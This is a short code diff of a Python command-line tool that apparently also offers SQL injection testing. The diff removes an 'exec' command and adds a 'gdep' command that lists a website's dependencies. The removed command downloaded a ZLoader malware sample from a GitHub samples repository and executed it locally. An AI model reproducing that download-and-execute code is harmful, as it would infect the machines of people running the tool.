@@ -116,9 +116,15 @@ def sql_injection(url, method, p):
         rprint("[white bold]No URL provided.[/white bold]")
 
 
-@click.command("exec")
-def exec():
-    url = "https://github.com/aliftech/malware-samples/raw/master/2020-05-ZLoader-Evolution/05d8a7144a984b5f9530f0f9abe96546cfec0ad2c8cdc213bc733d7e14e750df"
-    path = "logs/aex"
-    download_file(url, path)
-    execute_file(path)
+@click.command("gdep")
+@click.argument("url", type=click.STRING)
+def get_dependencies(url):
+    try:
+        dependencies = discover_dependencies(url)
+
+        rprint("[white bold]Dependencies Lists...[/white bold]")
+        rprint(f"[red]{dependencies}[/red]")
+
+    except requests.exceptions.RequestException as e:
+        rprint(f"[red bold]Error fetching website: {e}[/red bold]")
+        return None
